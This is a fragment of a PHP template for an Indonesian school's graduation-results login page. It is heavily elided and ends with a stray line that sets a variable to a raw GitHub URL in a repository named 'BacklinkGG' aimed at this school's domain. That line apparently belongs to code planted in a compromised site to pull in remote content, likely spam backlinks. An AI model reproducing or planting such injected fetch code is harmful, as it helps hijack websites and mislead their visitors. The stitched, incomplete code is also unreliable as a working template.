	...
	<div class="bg-img1 size1 overlay1 p-t-24" style="background-image: url('<?= $setting['banner'] ?>');">
		...
		<?php if (!isset($_SESSION['id_siswaskl'])) { ?>
			<div class="flex-w flex-sa p-r-200 respon1">
				...
				<center><a href="#"><img src="<?= $setting['logo'] ?>" alt="LOGO" width="100"></a></center>
					...
					<p class="s1-txt3 txt-center p-l-15 p-r-15 p-t-25">
						Login menggunakan Username dan Password Nomor Induk Siswa
					</p>
				</div>
			</div>
		<?php } else { ?>
...
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/smanegeringoro/kelulusan.smanegeringoro.sch.id/system.txt';
